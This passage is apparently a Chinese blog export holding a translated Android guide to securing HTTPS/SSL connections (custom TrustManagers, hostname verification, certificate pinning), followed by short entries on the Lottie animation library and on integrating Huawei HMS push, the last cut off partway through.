    <url>/Android/Android%E9%80%9A%E8%BF%87%20HTTPS%20%E5%92%8C%20SSL%20%E7%A1%AE%E4%BF%9D%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<blockquote>
<p>摘录: <a href="https://developer.android.google.cn/training/articles/security-ssl" target="_blank" rel="noopener">https://developer.android.google.cn/training/articles/security-ssl</a></p>
</blockquote>
<p>安全套接字层 (SSL)（现在技术上称为传输层安全协议 (TLS)）是一个通用构建块，用于在客户端与服务器之间进行加密通信。应用很可能以错误的方式使用 SSL，从而导致恶意实体能够拦截网络上的应用数据。为了帮助您确保您的应用不会出现这种情况，本文重点介绍了使用安全网络协议的常见陷阱，并解决对使用公钥基础结构 (PKI) 关注较多的问题。 </p>
<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>在典型的 SSL 使用场景中，会使用一个包含公钥及与其匹配的私钥的证书配置服务器。作为 SSL 客户端与服务器握手的一部分，服务器将通过使用公钥加密签署其证书来证明自己具有私钥。</p>
<p>不过，任何人都可以生成他们自己的证书和私钥，因此，一个简单的握手只能说明服务器知道与证书公钥匹配的私钥，除此之外什么都证明不了。解决此问题的一个方法是让客户端拥有其信任的一个或多个证书集。如果证书不在此集合中，则不会信任服务器。</p>
<p>但这个简单的方法有几个缺点。服务器应能够随时间的推移升级到更强的密钥（“密钥旋转”），使用新的公钥替换证书中的公钥。遗憾的是，客户端应用现在必须根据服务器配置发生的变化进行更新。如果服务器不在应用开发者的控制下（例如，如果服务器是一个第三方网络服务），则很容易出现问题。如果应用必须与网络浏览器或电子邮件应用等任意服务器通信，那么，此方法也会带来问题。</p>
<p>为弥补这些缺点，通常使用来自知名颁发者（称为证书颁发机构 (CA)）发放的证书配置服务器。主机平台一般包含其信任的知名 CA 的列表。从 Android 4.2 (Jelly Bean) 开始，Android 目前包含在每个版本中更新的 100 多个 CA。CA 具有一个证书和一个私钥，这点与服务器相似。为服务器发放证书时，CA 使用其私钥签署服务器证书。然后，客户端可以验证该服务器是否具有平台已知的 CA 发放的证书。</p>
<p>不过，在解决一些问题的同时，使用 CA 也会引发其他问题。因为 CA 为许多服务器发放证书，因此，您仍需要某种方式来确保您与您需要的服务器通信。为解决这个问题，CA 发放的证书通过 gmail.com 等具体名称或 *.google.com 等通配型主机集识别服务器。</p>
<p>以下示例会让这些概念更具体。下面的代码段来自命令行，openssl 工具的 s_client 命令将查看 Wikipedia 的服务器证书信息。它指定端口 443，因为此端口是 HTTPS的默认端口。此命令将 openssl s_client 的输出发送到 openssl x509，后者将根据 X.509 标准格式化与证书有关的信息。具体而言，此命令会要求相关主题，主题包含服务器名称信息和可识别 CA 的颁发者。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> openssl s_client -connect wikipedia.org:443 | openssl x509 -noout -subject -issuer</span></span><br><span class="line">subject= /serialNumber=sOrr2rKpMVP70Z6E9BT5reY008SJEdYv/C=US/O=*.wikipedia.org/OU=GT03314600/OU=See www.rapidssl.com/resources/cps (c)11/OU=Domain Control Validated - RapidSSL(R)/CN=*.wikipedia.org</span><br><span class="line">issuer= /C=US/O=GeoTrust, Inc./CN=RapidSSL CA</span><br></pre></td></tr></table></figure>
<p>您会看到证书是由 RapidSSL CA 为与 *.wikipedia.org 匹配的服务器发放的。</p>
<h4 id="一个-HTTPS-示例"><a href="#一个-HTTPS-示例" class="headerlink" title="一个 HTTPS 示例"></a>一个 HTTPS 示例</h4><p>假设您有一个由知名 CA 发放证书的网络服务器，那么，您可以使用如下简单代码发起安全的请求：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">"https://wikipedia.org"</span>);</span><br><span class="line">URLConnection urlConnection = url.openConnection();</span><br><span class="line">InputStream in = urlConnection.getInputStream();</span><br><span class="line">copyInputStreamToOutputStream(in, System.out);</span><br></pre></td></tr></table></figure>
<p>没错，就这么简单。如果您要调整 HTTP 请求，您可以切换到 HttpURLConnection。有关 HttpURLConnection 的 Android 文档就如何处理请求和响应标头，以及如何发布内容、管理 Cookie、使用代理、缓存响应等提供了更多示例。但对于验证证书和主机名的细节，Android 框架在 API 中为您考虑了这些细节。这些是您尽可能想要实现的目标。不过，下面还有一些其他注意事项。</p>
<h4 id="验证服务器证书的常见问题"><a href="#验证服务器证书的常见问题" class="headerlink" title="验证服务器证书的常见问题"></a>验证服务器证书的常见问题</h4><p>假设没有从 getInputStream() 接收内容，将引发异常：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor <span class="keyword">for</span> certification path not found.</span><br><span class="line">        at org.apache.harmony.xnet.provider.jsse.OpenSSLSocketImpl.startHandshake(OpenSSLSocketImpl.java:<span class="number">374</span>)</span><br><span class="line">        at libcore.net.http.HttpConnection.setupSecureSocket(HttpConnection.java:<span class="number">209</span>)</span><br><span class="line">        at libcore.net.http.HttpsURLConnectionImpl$HttpsEngine.makeSslConnection(HttpsURLConnectionImpl.java:<span class="number">478</span>)</span><br><span class="line">        at libcore.net.http.HttpsURLConnectionImpl$HttpsEngine.connect(HttpsURLConnectionImpl.java:<span class="number">433</span>)</span><br><span class="line">        at libcore.net.http.HttpEngine.sendSocketRequest(HttpEngine.java:<span class="number">290</span>)</span><br><span class="line">        at libcore.net.http.HttpEngine.sendRequest(HttpEngine.java:<span class="number">240</span>)</span><br><span class="line">        at libcore.net.http.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:<span class="number">282</span>)</span><br><span class="line">        at libcore.net.http.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:<span class="number">177</span>)</span><br><span class="line">        at libcore.net.http.HttpsURLConnectionImpl.getInputStream(HttpsURLConnectionImpl.java:<span class="number">271</span>)</span><br></pre></td></tr></table></figure>
<p>出现此情况的原因有很多，其中包括： </p>
<ol>
<li>颁发服务器证书的 CA 未知</li>
<li>服务器证书不是由 CA 签署的，而是自签署</li>
<li>服务器配置缺少中间 CA</li>
</ol>
<p>下面几部分将讨论如何解决这些问题，同时保持与服务器的连接处于安全状态。 </p>
<h5 id="未知的证书颁发机构"><a href="#未知的证书颁发机构" class="headerlink" title="未知的证书颁发机构"></a>未知的证书颁发机构</h5><p>在这种情况下，由于您具有系统不信任的 CA，将发生 SSLHandshakeException。原因可能是您有一个来自 Android 还未信任的新 CA 的证书，或您的应用在没有 CA 的较旧版本上运行。CA 未知的原因通常是因为它不是公共 CA，而是政府、公司或教育机构等组织发放的仅供自己使用的私有 CA。</p>
<p>幸运的是，您可以指示 HttpsURLConnection 信任特定的 CA 集。此过程可能有点复杂，下面的示例展示了这个过程，从 InputStream 获取一个特定的 CA，用该 CA 创建 KeyStore，然后用后者创建和初始化 TrustManager。TrustManager 是系统用于从服务器验证证书的工具，可以使用一个或多个 CA 从 KeyStore 创建，而创建的 TrustManager 将仅信任这些 CA。</p>
<p>如果是新的 TrustManager，此示例将初始化一个新的 SSLContext，后者可以提供一个 SSLSocketFactory，您可以通过 HttpsURLConnection 用它来替换默认的 SSLSocketFactory。这样一来，连接将使用您的 CA 验证证书。</p>
<p>下面是使用华盛顿大学的机构 CA 的完整示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Load CAs from an InputStream</span></span><br><span class="line"><span class="comment">// (could be from a resource or ByteArrayInputStream or ...)</span></span><br><span class="line">CertificateFactory cf = CertificateFactory.getInstance(<span class="string">"X.509"</span>);</span><br><span class="line"><span class="comment">// From https://www.washington.edu/itconnect/security/ca/load-der.crt</span></span><br><span class="line">InputStream caInput = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"load-der.crt"</span>));</span><br><span class="line">Certificate ca;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ca = cf.generateCertificate(caInput);</span><br><span class="line">    System.out.println(<span class="string">"ca="</span> + ((X509Certificate) ca).getSubjectDN());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    caInput.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a KeyStore containing our trusted CAs</span></span><br><span class="line">String keyStoreType = KeyStore.getDefaultType();</span><br><span class="line">KeyStore keyStore = KeyStore.getInstance(keyStoreType);</span><br><span class="line">keyStore.load(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">keyStore.setCertificateEntry(<span class="string">"ca"</span>, ca);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a TrustManager that trusts the CAs in our KeyStore</span></span><br><span class="line">String tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();</span><br><span class="line">TrustManagerFactory tmf = TrustManagerFactory.getInstance(tmfAlgorithm);</span><br><span class="line">tmf.init(keyStore);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create an SSLContext that uses our TrustManager</span></span><br><span class="line">SSLContext context = SSLContext.getInstance(<span class="string">"TLS"</span>);</span><br><span class="line">context.init(<span class="keyword">null</span>, tmf.getTrustManagers(), <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tell the URLConnection to use a SocketFactory from our SSLContext</span></span><br><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">"https://certs.cac.washington.edu/CAtest/"</span>);</span><br><span class="line">HttpsURLConnection urlConnection =</span><br><span class="line">    (HttpsURLConnection)url.openConnection();</span><br><span class="line">urlConnection.setSSLSocketFactory(context.getSocketFactory());</span><br><span class="line">InputStream in = urlConnection.getInputStream();</span><br><span class="line">copyInputStreamToOutputStream(in, System.out);</span><br></pre></td></tr></table></figure>
<p>借助一个知道您的 CA 的自定义 TrustManager，系统能够验证您的服务器证书是否来自值得信任的颁发者。</p>
<blockquote>
<p>注意：许多网站都会介绍一个糟糕的替代解决方案，让您安装一个没用的 TrustManager。如果您这样做还不如不加密通信，因为任何人都可以在公共 WLAN 热点下，使用伪装成您的服务器的代理发送您的用户流量，通过 DNS 欺骗攻击您的用户。然后，攻击者可以记录密码和其他个人数据。此方法之所以有效是因为攻击者可以生成一个证书，且没有可以切实验证证书是否来自值得信任的来源的 TrustManager，从而使您的应用可与任何人通信。因此，不要这样做，暂时性的也不行。如果您可以始终让您的应用信任服务器证书的颁发者，那就这样做吧。</p>
</blockquote>
<h5 id="自签署的服务器证书"><a href="#自签署的服务器证书" class="headerlink" title="自签署的服务器证书"></a>自签署的服务器证书</h5><p>导致出现 SSLHandshakeException 的第二种情况是自签署证书，表示服务器将按照自己的 CA 进行操作。这与证书颁发机构未知的情况相似，因此，您可以使用前面部分介绍的方法。</p>
<p>您可以创建自己的 TrustManager，这次直接信任服务器证书。这种方法具有前面所述的将应用与证书直接关联的所有弊端，但可以安全地操作。不过，您应谨慎为之，以确保您的自签署证书具有合理的强密钥。从 2012 年开始，可以接受一个指数为 65537 的 2048 位 RSA 签名，此签名的有效期为一年。旋转密钥时，您应查看颁发机构（例如 NIST）针对可接受的密钥提供的建议。</p>
<h5 id="缺少中间证书颁发机构"><a href="#缺少中间证书颁发机构" class="headerlink" title="缺少中间证书颁发机构"></a>缺少中间证书颁发机构</h5><p>导致出现 SSLHandshakeException 的第三种情况是缺少中间 CA。大多数公共 CA 不直接签署服务器证书。相反，它们使用自己的主要 CA 证书（称为根 CA）签署中间 CA。这样一来，根 CA 可以离线存储，从而降低泄露风险。不过，Android 等操作系统通常仅直接信任根 CA，这会在服务器证书（由中间 CA 签署）与证书验证程序（了解根 CA）之间留下一个小的信任缺口。为了解决这个问题，服务器在 SSL 握手期间不会仅向客户端发送它的证书，而是发送一个证书链，包括服务器 CA 以及到达可信的根 CA 所需要的任意中间证书。</p>
<p>要了解其实际应用，请看一下通过 openssl s_client 命令查看的 mail.google.com 证书链：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> openssl s_client -connect mail.google.com:443</span></span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:/C=US/ST=California/L=Mountain View/O=Google Inc/CN=mail.google.com</span><br><span class="line">   i:/C=ZA/O=Thawte Consulting (Pty) Ltd./CN=Thawte SGC CA</span><br><span class="line"> 1 s:/C=ZA/O=Thawte Consulting (Pty) Ltd./CN=Thawte SGC CA</span><br><span class="line">   i:/C=US/O=VeriSign, Inc./OU=Class 3 Public Primary Certification Authority</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>这表明服务器会为 mail.google.com 发送一个由 Thawte SGC CA（中间 CA）发放的证书，同时为 Thawte SGC CA 发送一个由 Verisign CA（Android 信任的主要 CA）发放的证书。</p>
<p>不过，对服务器进行配置以便不添加必要的中间 CA 也是屡见不鲜。例如，下面的服务器会引发 Android 浏览器错误和 Android 应用异常：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> openssl s_client -connect egov.uscis.gov:443</span></span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:/C=US/ST=District Of Columbia/L=Washington/O=U.S. Department of Homeland Security/OU=United States Citizenship and Immigration Services/OU=Terms of use at www.verisign.com/rpa (c)05/CN=egov.uscis.gov</span><br><span class="line">   i:/C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https://www.verisign.com/rpa (c)10/CN=VeriSign Class 3 International Server CA - G3</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
<p>有趣的是，在大多数桌面浏览器中访问此服务器不会引发完全未知的 CA 或自签署服务器证书所引发的类似错误。这是因为大多数桌面浏览器都会将可信的中间 CA 缓存一段时间。当浏览器从某个网站访问和了解中间 CA 后，下次它就不需要将中间 CA 添加在证书链中。</p>
<p>有些网站会专门为提供资源的辅助网络服务器这样做。例如，他们可能让具有完整证书链的服务器提供主 HTML 页面，让不包含 CA 的服务器提供图像、CSS 或 JavaScript 等资源，以节省带宽。遗憾的是，这些服务器有时候可能会提供您正在尝试从 Android 应用调用的网络服务，这一点让人难以接受。</p>
<p>可以通过两种方法解决此问题：</p>
<ul>
<li>配置服务器以便在服务器链中添加中间 CA。大多数 CA 都可以提供有关如何为所有常用网络服务器执行此操作的文档。如果您需要网站至少通过 Android 4.2 使用默认 Android 浏览器，那么这是唯一的方法。</li>
<li>或者，像对待其他任何未知 CA 一样对待中间 CA，并创建一个 TrustManager 以直接信任它，如前面的两部分中所述。</li>
</ul>
<h4 id="主机名验证的常见问题"><a href="#主机名验证的常见问题" class="headerlink" title="主机名验证的常见问题"></a>主机名验证的常见问题</h4><p>正如本文开头所述，验证 SSL 连接有两个关键环节。首先是验证证书是否来自值得信任的来源，这是前面部分重点讲述的内容。而此部分侧重于第二个环节：确保您正在通信的服务器提供正确的证书。如果没有提供，您通常会看到类似于下面的错误：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ava.io.IOException: Hostname <span class="string">'example.com'</span> was not verified</span><br><span class="line">        at libcore.net.http.HttpConnection.verifySecureSocketHostname(HttpConnection.java:<span class="number">223</span>)</span><br><span class="line">        at libcore.net.http.HttpsURLConnectionImpl$HttpsEngine.connect(HttpsURLConnectionImpl.java:<span class="number">446</span>)</span><br><span class="line">        at libcore.net.http.HttpEngine.sendSocketRequest(HttpEngine.java:<span class="number">290</span>)</span><br><span class="line">        at libcore.net.http.HttpEngine.sendRequest(HttpEngine.java:<span class="number">240</span>)</span><br><span class="line">        at libcore.net.http.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:<span class="number">282</span>)</span><br><span class="line">        at libcore.net.http.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:<span class="number">177</span>)</span><br><span class="line">        at libcore.net.http.HttpsURLConnectionImpl.getInputStream(HttpsURLConnectionImpl.java:<span class="number">271</span>)</span><br></pre></td></tr></table></figure>
<p>出现此错误的一个原因是服务器配置错误。配置服务器所使用的证书不具有与您尝试连接的服务器匹配的主题或主题备用名称字段。许多不同的服务器可能使用一个证书。例如，使用 openssl s_client -connect google.com:443 | openssl x509 -text 查看 google.com 证书，您不仅可以看到一个支持 <em>.google.com 的主题，而且还能看到适用于 </em>.youtube.com、*.android.com 等的主题备用名称。仅当您要连接的服务器名称没有被证书列为可接受时才会发生这种错误。</p>
<p>不幸的是，还有另外一个原因也会引发此错误，即虚拟托管。当多个使用 HTTP 的主机名共享服务器时，网络服务器可以通过 HTTP/1.1 请求识别客户端正在寻找哪个目标主机名。遗憾的是，使用 HTTPS 会使情况变得复杂，因为服务器必须在看到 HTTP 请求前知道返回哪个证书。为了解决此问题，较新的 SSL 版本（特别是 TLSv.1.0 及更高版本）支持服务器名称指示 (SNI)，后者允许 SSL 客户端向服务器指定预期的主机名，以便可以返回正确的证书。</p>
<p>幸运的是，自 Android 2.3 开始，HttpsURLConnection 就支持 SNI。如果您需要支持 Android 2.2（及更旧的版本），一种解决办法是在一个唯一端口上设置备用虚拟主机，以便了解要返回哪个服务器证书。</p>
<p>比较极端的替代方法是不使用服务器默认情况下返回的验证程序，而是将 HostnameVerifier 替换为不使用您的虚拟机主机名的验证程序。</p>
<blockquote>
<p>注意：如果其他虚拟主机不在您的控制之下，则更换 HostnameVerifier 非常危险，因为中间人攻击会在您不知情的情况下将流量引向其他服务器。</p>
</blockquote>
<p>如果您仍确定要替换主机名验证，请看下面的示例，它将针对单个 URLConnection 的验证程序替换为确认主机名至少符合应用预期的验证程序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Create an HostnameVerifier that hardwires the expected hostname.</span></span><br><span class="line"><span class="comment">// Note that is different than the URL's hostname:</span></span><br><span class="line"><span class="comment">// example.com versus example.org</span></span><br><span class="line">HostnameVerifier hostnameVerifier = <span class="keyword">new</span> HostnameVerifier() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String hostname, SSLSession session)</span> </span>&#123;</span><br><span class="line">        HostnameVerifier hv =</span><br><span class="line">            HttpsURLConnection.getDefaultHostnameVerifier();</span><br><span class="line">        <span class="keyword">return</span> hv.verify(<span class="string">"example.com"</span>, session);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tell the URLConnection to use our HostnameVerifier</span></span><br><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">"https://example.org/"</span>);</span><br><span class="line">HttpsURLConnection urlConnection =</span><br><span class="line">    (HttpsURLConnection)url.openConnection();</span><br><span class="line">urlConnection.setHostnameVerifier(hostnameVerifier);</span><br><span class="line">InputStream in = urlConnection.getInputStream();</span><br><span class="line">copyInputStreamToOutputStream(in, System.out);</span><br></pre></td></tr></table></figure>
<p>但请记住，如果您发现自己更换了主机名验证，特别是因虚拟托管引起的更换，那么，当其他虚拟主机不在您的控制之下时，这样做仍非常危险，您应找到一个可以避免此问题的备用托管安排。</p>
<h4 id="有关直接使用-SSLSocket-的警告"><a href="#有关直接使用-SSLSocket-的警告" class="headerlink" title="有关直接使用 SSLSocket 的警告"></a>有关直接使用 SSLSocket 的警告</h4><p>到目前为止，所举示例都是侧重于使用 HttpsURLConnection 的 HTTPS。有时候应用需要单独使用 SSL与 HTTP。例如，某个电子邮件应用可能使用 SSL 的变体 SMTP、POP3 或 IMAP。在这些情况下，应用将需要直接使用 SSLSocket，与 HttpsURLConnection 在内部执行的操作非常相似。</p>
<p>目前为止所介绍的用于处理证书验证问题的技术也适用于 SSLSocket。事实上，使用自定义 TrustManager 时，传递到 HttpsURLConnection 的是 SSLSocketFactory。因此，如果您需要使用一个带有 SSLSocket 的自定义 TrustManager，请遵循相同的步骤，并使用 SSLSocketFactory 创建您的 SSLSocket。</p>
<blockquote>
<p>注意：SSLSocket 不会执行主机名验证。由您的应用执行自己的主机名验证，最好通过使用预期的主机名调用 getDefaultHostnameVerifier() 进行验证。另外，请注意，出现错误时，HostnameVerifier.verify() 不会引发异常，而是返回一个布尔结果，您必须明确地检查该结果。</p>
</blockquote>
<p>以下示例向您展示了如何执行此操作。该示例显示在没有 SNI 支持的情况下连接到 gmail.com 端口 443 时，您将收到 mail.google.com 的证书。在此情况下，这正是期待的结果，因此，请执行检查以确保证书确实是 mail.google.com 的证书：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Open SSLSocket directly to gmail.com</span></span><br><span class="line">SocketFactory sf = SSLSocketFactory.getDefault();</span><br><span class="line">SSLSocket socket = (SSLSocket) sf.createSocket(<span class="string">"gmail.com"</span>, <span class="number">443</span>);</span><br><span class="line">HostnameVerifier hv = HttpsURLConnection.getDefaultHostnameVerifier();</span><br><span class="line">SSLSession s = socket.getSession();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Verify that the certicate hostname is for mail.google.com</span></span><br><span class="line"><span class="comment">// This is due to lack of SNI support in the current SSLSocket.</span></span><br><span class="line"><span class="keyword">if</span> (!hv.verify(<span class="string">"mail.google.com"</span>, s)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SSLHandshakeException(<span class="string">"Expected mail.google.com, "</span></span><br><span class="line">                                    <span class="string">"found "</span> + s.getPeerPrincipal());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// At this point SSLSocket performed certificate verificaiton and</span></span><br><span class="line"><span class="comment">// we have performed hostname verification, so it is safe to proceed.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... use socket ...</span></span><br><span class="line">socket.close();</span><br></pre></td></tr></table></figure>
<h4 id="列入黑名单"><a href="#列入黑名单" class="headerlink" title="列入黑名单"></a>列入黑名单</h4><p>为了仅向正确验证的服务器和域的所有者发放证书，SSL 非常依赖 CA。少数情况下，CA 也会受骗，如 Comodo 和 DigiNotar 出现了信息泄露，从而导致某个主机名的证书被发放给服务器或域的所有者以外的其他人。</p>
<p>为了降低此风险，Android 提供了将某些证书甚至整个 CA 列入黑名单的功能。尽管此名单过去已内置到操作系统中，但从 Android 4.2 开始，可以远程更新此名单，便于处理将来的泄露问题。</p>
<h4 id="证书固定"><a href="#证书固定" class="headerlink" title="证书固定"></a>证书固定</h4><p>通过名称为证书固定的技术，应用可以更好地保护自己免受以欺诈方式发放的证书的攻击。这里基本上使用上面未知 CA 案例中提供的示例，将应用的可信 CA 限制在一个很小的 CA 集范围内，应用的服务器将使用这个集合。这样可以防止因泄露系统中其他 100 多个 CA 中的某个 CA 而破坏应用安全通道。</p>
<h4 id="客户端证书"><a href="#客户端证书" class="headerlink" title="客户端证书"></a>客户端证书</h4><p>本文重点讲述 SSL 用户与服务器进行安全通信。SSL 也支持客户端证书的概念，客户端证书允许服务器验证客户端的身份。尽管这超出了本文的讨论范围，但使用的技术与指定自定义 TrustManager 相似。请在 HttpsURLConnection 的相关文档中查看有关创建自定义 KeyManager 的讨论。</p>
<h4 id="Nogotofail：网络流量安全测试工具"><a href="#Nogotofail：网络流量安全测试工具" class="headerlink" title="Nogotofail：网络流量安全测试工具"></a>Nogotofail：网络流量安全测试工具</h4><p> 对于已知的 TLS/SSL 漏洞和错配置，可以通过 Nogotofail 轻松确认您的应用程序是否安全。它是一款自动执行的工具，功能强大并且可扩展，用于测试通过它传送网络流量的任意设备的网络安全问题。</p>
<p>Nogotofail 可用于三个主要用例：</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">查找错误和漏洞。</span><br><span class="line">验证修复并监测回归。</span><br><span class="line">了解哪些应用和设备正在生成哪些流量。</span><br></pre></td></tr></table></figure>
<p>Nogotofail 适用于 Android、iOS、Linux、Windows、Chrome 操作系统、OSX。事实上，任何用于连接互联网的设备都可以使用 Nogotofail。在 Android 和 Linux 上提供了一个易于使用的客户端来配置设置和获取通知，同时还提供了一个本身可作为路由器、VPN 服务器或代理部署的攻击引擎。</p>
<p>您可以在 <a href="https://github.com/google/nogotofail" target="_blank" rel="noopener">Nogotofail</a> 开源项目网站上访问此工具。 </p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Lottie动画库</title>
    <url>/Android/Lottie%E5%8A%A8%E7%94%BB%E5%BA%93/</url>
    <content><![CDATA[<p><a href="https://airbnb.design/lottie/" target="_blank" rel="noopener">【Lottie】</a> 是Airbnb开源的一个面向 iOS、Android、React Native 的动画库，能分析 Adobe After Effects 导出的动画，并且能让原生 App 像使用静态素材一样使用这些动画，完美实现动画效果。</p>
<p>android 项目地址：<a href="https://github.com/airbnb/lottie-android" target="_blank" rel="noopener">https://github.com/airbnb/lottie-android</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">  implementation <span class="string">'com.airbnb.android:lottie:4.2.0'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/android/lottie-Example2.gif" alt></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>lottie</tag>
      </tags>
  </entry>
  <entry>
    <title>Android集成HMS推送</title>
    <url>/Android/Android%E9%9B%86%E6%88%90HMS%E6%8E%A8%E9%80%81/</url>
    <content><![CDATA[<h3 id="一、-创建项目"><a href="#一、-创建项目" class="headerlink" title="一、 创建项目"></a>一、 创建项目</h3><p><img src="/images/hms/HMS1.png" alt><br><img src="/images/hms/HMS2.png" alt></p>
<h3 id="二、-添加应用"><a href="#二、-添加应用" class="headerlink" title="二、 添加应用"></a>二、 添加应用</h3><p><img src="/images/hms/HMS3.png" alt><br><img src="/images/hms/HMS4.png" alt></p>
<p>添加完应用会自动跳转到 “接入指南”</p>
<h3 id="三、-集成到Android项目"><a href="#三、-集成到Android项目" class="headerlink" title="三、 集成到Android项目"></a>三、 集成到Android项目</h3><p><img src="/images/hms/HMS5.png" alt></p>
<p><img src="/images/hms/HMS6.png" alt></p>
<p>集成HMS Core SDK</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    implementation &apos;com.huawei.hms:push:&#123;version&#125;&apos; # 当前版本5.0.4.302</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="四、-SHA256指纹和OAuth推送所需要的参数"><a href="#四、-SHA256指纹和OAuth推送所需要的参数" class="headerlink" title="四、 SHA256指纹和OAuth推送所需要的参数"></a>四、 SHA256指纹和OAuth推送所需要的参数</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ keytool -list -v -keystore C:\TestApp.jks</span><br></pre></td></tr></table></figure>
<p><img src="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210324163206.40382298029097015414359028930325:50520324024935:2800:B46061FF97D1157E1B3C485084546F84358B59062E35B31FDC2424F763059475.png?needInitFileName=true?needInitFileName=true" alt></p>
<p><img src="/images/hms/HMS7.png" alt></p>
<h3 id="五、服务端推送"><a href="#五、服务端推送" class="headerlink" title="五、服务端推送"></a>五、服务端推送</h3><p><a href="https://developer.huawei.com/consumer/cn/doc/development/HMSCore-Guides/android-server-dev-0000001050040110" target="_blank" rel="noopener">【构建发送消息请求指南】</a></p>
<h4 id="1-您的服务器获取Access-Token，详情请参见客户端模式。"><a href="#1-您的服务器获取Access-Token，详情请参见客户端模式。" class="headerlink" title="1.  您的服务器获取Access Token，详情请参见客户端模式。"></a>1.  您的服务器获取Access Token，详情请参见<a href="https://developer.huawei.com/consumer/cn/doc/development/HMSCore-Guides/open-platform-oauth-0000001053629189#ZH-CN_TOPIC_0000001053629189__section12493191334711" target="_blank" rel="noopener">客户端模式</a>。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /oauth2/v3/token HTTP/1.1</span><br><span class="line">Host: oauth-login.cloud.huawei.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">grant_type=client_credentials&amp;</span><br><span class="line">client_id=&lt; APP ID &gt;&amp;</span><br><span class="line">client_secret=&lt; APP SECRET &gt;</span><br></pre></td></tr></table></figure>
<p> 响应</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"access_token"</span>: <span class="string">"&lt;返回的Access Token&gt;"</span>,</span><br><span class="line">  <span class="attr">"expires_in"</span>: <span class="number">3600</span>,</span><br><span class="line">  <span class="attr">"token_type"</span>: <span class="string">"Bearer"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-您的服务器调用API发送Push消息，详情请参见下行消息。"><a href="#2-您的服务器调用API发送Push消息，详情请参见下行消息。" class="headerlink" title="2. 您的服务器调用API发送Push消息，详情请参见下行消息。"></a>2. 您的服务器调用API发送Push消息，详情请参见<a href="https://developer.huawei.com/consumer/cn/doc/development/HMSCore-References-V5/https-send-api-0000001050986197-V5#ZH-CN_TOPIC_0000001124288117__section8686112674319" target="_blank" rel="noopener">下行消息</a>。</h4><p>HTTPS POST URL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST https://push-api.cloud.huawei.com/v1/[appId]/messages:send</span><br></pre></td></tr></table></figure>
<p>请求消息头示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: application/json; charset=UTF-8Authorization: Bearer CF3Xl2XV6jMKZgqYSZFws9IPlgDvxqOfFSmrlmtkTRupbU2VklvhX9kC9JCnKVSDX2VrDgAPuzvNm3WccUIaDg==</span><br></pre></td></tr></table></figure>
<p>说明</p>
